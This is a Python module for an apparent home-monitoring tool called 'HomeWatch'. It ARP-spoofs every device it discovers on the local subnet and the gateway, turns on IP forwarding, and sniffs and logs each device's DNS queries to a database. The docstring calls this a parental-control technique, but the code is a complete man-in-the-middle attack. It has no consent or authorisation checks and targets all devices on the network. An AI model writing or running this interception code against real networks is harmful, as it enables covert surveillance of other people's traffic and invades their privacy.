#!/usr/bin/env python3
"""
Network-wide capture module for HomeWatch.
Uses ARP spoofing to intercept DNS queries from ALL devices on the network.
This is the same technique used by parental control software.
"""

import threading
import subprocess
import platform
import time
import re
import socket
from typing import Optional, Tuple, List

# Check if we're on Windows
IS_WINDOWS = platform.system() == 'Windows'


class NetworkWideCapture:
    """
    Captures DNS traffic from ALL devices on the local network.
    Uses ARP spoofing to redirect traffic through this machine.
    """

    def __init__(self, database):
        self.database = database
        self.is_running = False
        self._stop_event = threading.Event()
        self._threads = []
        self._gateway_ip = None
        self._gateway_mac = None
        self._my_ip = None
        self._my_mac = None
        self._interface = None
        self._packet_count = 0
        self._error_message = None
        self._target_ips = []  # IPs we're spoofing

    def start(self, interface: str = 'auto') -> Tuple[bool, str]:
        """Start network-wide capture."""
        if self.is_running:
            return False, "Already running"

        self._stop_event.clear()
        self._error_message = None
        self._packet_count = 0

        # Get network info
        success, msg = self._setup_network_info(interface)
        if not success:
            return False, msg

        # Enable IP forwarding (so traffic still flows)
        success, msg = self._enable_ip_forwarding()
        if not success:
            return False, msg

        self.is_running = True

        # Start ARP spoofing thread
        spoof_thread = threading.Thread(target=self._arp_spoof_loop, daemon=True)
        spoof_thread.start()
        self._threads.append(spoof_thread)

        # Start packet capture thread
        capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        capture_thread.start()
        self._threads.append(capture_thread)

        return True, f"Monitoring ALL devices on network (gateway: {self._gateway_ip})"

    def stop(self):
        """Stop capture and restore network."""
        if not self.is_running:
            return False

        print("[STOPPING] Restoring network...")
        self._stop_event.set()
        self.is_running = False

        # Restore ARP tables
        self._restore_arp()

        # Wait for threads
        for t in self._threads:
            t.join(timeout=3)
        self._threads = []

        # Disable IP forwarding
        self._disable_ip_forwarding()

        return True

    def get_status(self):
        """Get current capture status."""
        return {
            'running': self.is_running,
            'packets': self._packet_count,
            'error': self._error_message,
            'devices': len(self._target_ips)
        }

    def _setup_network_info(self, interface: str) -> Tuple[bool, str]:
        """Gather network information needed for spoofing."""
        try:
            from scapy.all import conf, get_if_hwaddr, ARP, Ether, srp

            # Get default interface if auto
            if interface == 'auto':
                self._interface = conf.iface
            else:
                self._interface = interface

            # Get our IP and MAC
            self._my_ip = self._get_my_ip()
            if not self._my_ip:
                return False, "Could not determine local IP address"

            try:
                self._my_mac = get_if_hwaddr(self._interface)
            except:
                self._my_mac = self._get_mac_address()

            if not self._my_mac:
                return False, "Could not determine MAC address"

            # Get gateway IP
            self._gateway_ip = self._get_gateway_ip()
            if not self._gateway_ip:
                return False, "Could not determine gateway IP"

            # Get gateway MAC via ARP
            self._gateway_mac = self._get_mac(self._gateway_ip)
            if not self._gateway_mac:
                return False, f"Could not get gateway MAC address for {self._gateway_ip}"

            # Discover devices on network
            self._target_ips = self._discover_devices()

            print(f"[SETUP] Interface: {self._interface}")
            print(f"[SETUP] My IP: {self._my_ip}, MAC: {self._my_mac}")
            print(f"[SETUP] Gateway: {self._gateway_ip}, MAC: {self._gateway_mac}")
            print(f"[SETUP] Found {len(self._target_ips)} devices on network")

            return True, "Network info gathered"

        except ImportError:
            return False, "Scapy not installed. Run: pip install scapy"
        except Exception as e:
            return False, f"Setup failed: {e}"

    def _get_my_ip(self) -> Optional[str]:
        """Get local IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def _get_mac_address(self) -> Optional[str]:
        """Get local MAC address."""
        try:
            if IS_WINDOWS:
                output = subprocess.check_output("getmac", shell=True).decode()
                mac = re.search(r'([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}', output)
                return mac.group(0).replace('-', ':').lower() if mac else None
            else:
                output = subprocess.check_output("ip link show", shell=True).decode()
                mac = re.search(r'link/ether\s+([0-9a-f:]{17})', output)
                return mac.group(1) if mac else None
        except:
            return None

    def _get_gateway_ip(self) -> Optional[str]:
        """Get default gateway IP."""
        # Method 1: Try scapy's routing table (most reliable)
        try:
            from scapy.all import conf
            # Get the gateway from scapy's routing table
            for route in conf.route.routes:
                # Look for default route (destination 0.0.0.0)
                if route[0] == 0:  # default route
                    gateway = route[2]
                    if gateway and gateway != '0.0.0.0':
                        print(f"[DEBUG] Gateway from scapy: {gateway}")
                        return gateway
        except Exception as e:
            print(f"[DEBUG] Scapy route method failed: {e}")

        # Method 2: Try PowerShell (Windows)
        if IS_WINDOWS:
            try:
                output = subprocess.check_output(
                    ['powershell', '-Command',
                     '(Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1).NextHop'],
                    shell=False
                ).decode().strip()
                if output and re.match(r'\d+\.\d+\.\d+\.\d+', output):
                    print(f"[DEBUG] Gateway from PowerShell: {output}")
                    return output
            except Exception as e:
                print(f"[DEBUG] PowerShell method failed: {e}")

            # Method 3: Try ipconfig (Windows)
            try:
                output = subprocess.check_output("ipconfig", shell=True).decode('utf-8', errors='ignore')
                # Try multiple patterns for different Windows languages/versions
                patterns = [
                    r'Default Gateway[.\s]*:\s*(\d+\.\d+\.\d+\.\d+)',
                    r'Gateway[.\s]*:\s*(\d+\.\d+\.\d+\.\d+)',
                    r'Puerta de enlace[.\s]*:\s*(\d+\.\d+\.\d+\.\d+)',  # Spanish
                    r'Standardgateway[.\s]*:\s*(\d+\.\d+\.\d+\.\d+)',  # German
                ]
                for pattern in patterns:
                    match = re.search(pattern, output, re.IGNORECASE)
                    if match:
                        print(f"[DEBUG] Gateway from ipconfig: {match.group(1)}")
                        return match.group(1)
            except Exception as e:
                print(f"[DEBUG] ipconfig method failed: {e}")
        else:
            # Linux/Mac
            try:
                output = subprocess.check_output("ip route show default", shell=True).decode()
                match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', output)
                if match:
                    return match.group(1)
            except:
                pass

            try:
                output = subprocess.check_output("netstat -rn", shell=True).decode()
                match = re.search(r'default\s+(\d+\.\d+\.\d+\.\d+)', output)
                if match:
                    return match.group(1)
            except:
                pass

        # Method 4: Infer from our IP (assume .1 is gateway)
        if self._my_ip:
            parts = self._my_ip.split('.')
            if len(parts) == 4:
                inferred = f"{parts[0]}.{parts[1]}.{parts[2]}.1"
                print(f"[DEBUG] Inferred gateway: {inferred}")
                return inferred

        return None

    def _get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for an IP via ARP."""
        try:
            from scapy.all import ARP, Ether, srp

            arp = ARP(pdst=ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp

            result = srp(packet, timeout=3, verbose=False, iface=self._interface)[0]

            if result:
                return result[0][1].hwsrc
            return None
        except Exception as e:
            print(f"[ERROR] Failed to get MAC for {ip}: {e}")
            return None

    def _discover_devices(self) -> List[str]:
        """Discover devices on the local network."""
        try:
            from scapy.all import ARP, Ether, srp

            # Get network range from our IP (assume /24)
            ip_parts = self._my_ip.split('.')
            network = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"

            print(f"[DISCOVERY] Scanning {network}...")

            arp = ARP(pdst=network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp

            result = srp(packet, timeout=5, verbose=False, iface=self._interface)[0]

            devices = []
            for sent, received in result:
                ip = received.psrc
                # Skip our IP and gateway
                if ip != self._my_ip and ip != self._gateway_ip:
                    devices.append(ip)
                    print(f"[FOUND] Device: {ip} ({received.hwsrc})")

            return devices

        except Exception as e:
            print(f"[ERROR] Discovery failed: {e}")
            return []

    def _enable_ip_forwarding(self) -> Tuple[bool, str]:
        """Enable IP forwarding so traffic still flows."""
        try:
            if IS_WINDOWS:
                # Enable IP routing on Windows
                subprocess.run(
                    ['powershell', '-Command',
                     'Set-NetIPInterface -Forwarding Enabled -PolicyStore ActiveStore'],
                    capture_output=True
                )
                # Also try reg key method
                subprocess.run(
                    ['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
                     '/v', 'IPEnableRouter', '/t', 'REG_DWORD', '/d', '1', '/f'],
                    capture_output=True
                )
            else:
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)

            print("[SETUP] IP forwarding enabled")
            return True, "IP forwarding enabled"
        except Exception as e:
            return False, f"Failed to enable IP forwarding: {e}"

    def _disable_ip_forwarding(self):
        """Disable IP forwarding."""
        try:
            if IS_WINDOWS:
                subprocess.run(
                    ['powershell', '-Command',
                     'Set-NetIPInterface -Forwarding Disabled -PolicyStore ActiveStore'],
                    capture_output=True
                )
            else:
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True)
        except:
            pass

    def _arp_spoof_loop(self):
        """Continuously send ARP spoofing packets."""
        try:
            from scapy.all import ARP, Ether, sendp

            print("[ARP] Starting ARP spoofing...")

            while not self._stop_event.is_set():
                try:
                    # Tell each target that we are the gateway
                    for target_ip in self._target_ips:
                        target_mac = self._get_mac(target_ip)
                        if target_mac:
                            # Tell target: gateway is at our MAC
                            packet = Ether(dst=target_mac) / ARP(
                                op=2,  # is-at
                                pdst=target_ip,
                                hwdst=target_mac,
                                psrc=self._gateway_ip,
                                hwsrc=self._my_mac
                            )
                            sendp(packet, verbose=False, iface=self._interface)

                    # Tell gateway that we are each target
                    for target_ip in self._target_ips:
                        packet = Ether(dst=self._gateway_mac) / ARP(
                            op=2,
                            pdst=self._gateway_ip,
                            hwdst=self._gateway_mac,
                            psrc=target_ip,
                            hwsrc=self._my_mac
                        )
                        sendp(packet, verbose=False, iface=self._interface)

                except Exception as e:
                    print(f"[ARP] Spoof error: {e}")

                # Wait before next round
                self._stop_event.wait(2)

        except Exception as e:
            print(f"[ARP] Fatal error: {e}")
            self._error_message = str(e)

    def _restore_arp(self):
        """Restore correct ARP entries."""
        try:
            from scapy.all import ARP, Ether, sendp

            print("[ARP] Restoring ARP tables...")

            for _ in range(5):  # Send multiple times to ensure restoration
                for target_ip in self._target_ips:
                    target_mac = self._get_mac(target_ip)
                    if target_mac:
                        # Tell target the real gateway MAC
                        packet = Ether(dst=target_mac) / ARP(
                            op=2,
                            pdst=target_ip,
                            hwdst=target_mac,
                            psrc=self._gateway_ip,
                            hwsrc=self._gateway_mac
                        )
                        sendp(packet, verbose=False, iface=self._interface)

                        # Tell gateway the real target MAC
                        packet = Ether(dst=self._gateway_mac) / ARP(
                            op=2,
                            pdst=self._gateway_ip,
                            hwdst=self._gateway_mac,
                            psrc=target_ip,
                            hwsrc=target_mac
                        )
                        sendp(packet, verbose=False, iface=self._interface)

                time.sleep(0.5)

            print("[ARP] Network restored")
        except Exception as e:
            print(f"[ARP] Restore error: {e}")

    def _capture_loop(self):
        """Capture DNS packets from all spoofed traffic."""
        try:
            from scapy.all import sniff, DNS, DNSQR, IP, conf

            conf.verb = 0

            def packet_handler(packet):
                if self._stop_event.is_set():
                    return

                try:
                    if packet.haslayer(DNS) and packet.haslayer(DNSQR):
                        dns_query = packet[DNSQR].qname.decode('utf-8', errors='ignore')
                        if dns_query.endswith('.'):
                            dns_query = dns_query[:-1]

                        if self._is_valid_domain(dns_query):
                            source_ip = packet[IP].src if packet.haslayer(IP) else 'unknown'
                            self._record_visit(dns_query, source_ip)
                            self._packet_count += 1

                except Exception:
                    pass

            print("[CAPTURE] Listening for DNS queries from all devices...")

            sniff(
                filter="udp port 53",
                prn=packet_handler,
                store=False,
                stop_filter=lambda x: self._stop_event.is_set(),
                iface=self._interface
            )

        except Exception as e:
            print(f"[CAPTURE] Error: {e}")
            self._error_message = str(e)

    def _is_valid_domain(self, domain: str) -> bool:
        """Filter out noise domains."""
        if not domain or len(domain) < 4:
            return False

        domain_lower = domain.lower()

        skip_patterns = [
            '.local', '.lan', '.internal', '.home', '.localdomain',
            'localhost', '._dns-sd', '._tcp', '._udp', '_msdcs',
            '.in-addr.arpa', '.ip6.arpa', 'wpad.', 'isatap.',
            '.msftconnecttest.', '.windowsupdate.',
            'time.windows.com', 'dns.msftncsi',
            'safebrowsing.', 'ocsp.', 'crl.',
            '.arpa', 'broadcasthost', '_kerberos'
        ]

        for pattern in skip_patterns:
            if pattern in domain_lower:
                return False

        if '.' not in domain:
            return False

        if re.match(r'^\d+\.\d+\.\d+\.\d+$', domain):
            return False

        return True

    def _record_visit(self, domain: str, device_ip: str):
        """Record a website visit."""
        domain = domain.strip().lower()
        url = f"https://{domain}/"

        print(f"[CAPTURED] {domain} <- {device_ip}")

        self.database.add_capture(
            url=url,
            domain=domain,
            device_ip=device_ip,
            device_name=None,
            protocol='DNS'
        )


# For testing
if __name__ == '__main__':
    from database import Database

    print("=" * 60)
    print("HomeWatch - Network-Wide Capture Test")
    print("This will monitor ALL devices on your network!")
    print("=" * 60)

    db = Database()
    capture = NetworkWideCapture(db)

    success, message = capture.start('auto')
    if not success:
        print(f"\n[FAILED] {message}")
        exit(1)

    print(f"\n[OK] {message}")
    print("\nCapturing from all devices... Press Ctrl+C to stop\n")

    try:
        while capture.is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\nStopping...")
        capture.stop()

    print(f"\nTotal URLs captured: {db.get_total_count()}")
